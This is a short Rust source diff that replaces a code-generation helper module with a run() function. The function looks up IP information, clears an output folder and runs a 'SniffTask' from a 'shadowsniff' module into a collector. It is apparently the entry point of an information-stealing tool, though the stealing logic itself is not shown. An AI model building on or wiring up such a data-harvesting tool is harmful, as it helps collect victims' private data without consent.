@@ -24,41 +24,33 @@
  * SOFTWARE.
  */
 
-#![feature(tuple_trait)]
+use alloc::format;
+use collector::atomic::AtomicCollector;
+use collector::display::PrimitiveDisplayCollector;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::{FileSystem, FileSystemExt};
+use ipinfo::init_ip_info;
+use shadowsniff::SniffTask;
+use tasks::Task;
+use utils::log_debug;
 
-use inquire::InquireError;
-use proc_macro2::TokenStream;
-use std::fs;
-use std::io::Write;
-use std::marker::Tuple;
-use std::path::PathBuf;
-use tempfile::NamedTempFile;
-
-pub mod send_expr;
-pub mod send_settings;
-pub mod sender_service;
-
-pub trait ToExpr<Args: Tuple = ()> {
-    fn to_expr(&self, args: Args) -> TokenStream;
-}
-
-pub trait ToExprExt<Args: Tuple = ()>: ToExpr<Args> {
-    fn to_expr_temp_file(&self, args: Args) -> PathBuf;
-}
-
-impl<T: ToExpr<Args>, Args: Tuple> ToExprExt<Args> for T {
-    fn to_expr_temp_file(&self, args: Args) -> PathBuf {
-        let mut expr_file: NamedTempFile = NamedTempFile::new().unwrap();
-        expr_file.disable_cleanup(true);
-
-        write!(expr_file, "{}", self.to_expr(args)).unwrap();
-
-        fs::canonicalize(expr_file.path()).unwrap()
+#[inline(always)]
+pub fn run() {
+    if !init_ip_info() {
+        panic!()
     }
-}
 
-pub trait Ask {
-    fn ask() -> Result<Self, InquireError>
-    where
-        Self: Sized;
+    let fs = StorageFileSystem;
+    let out = &Path::new("output");
+    let _ = fs.remove_dir_all(out);
+    let _ = fs.mkdir(out);
+
+    let collector = AtomicCollector::default();
+
+    SniffTask::default().run(out, &fs, &collector);
+
+    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
+
+    log_debug!("{displayed_collector}");
 }
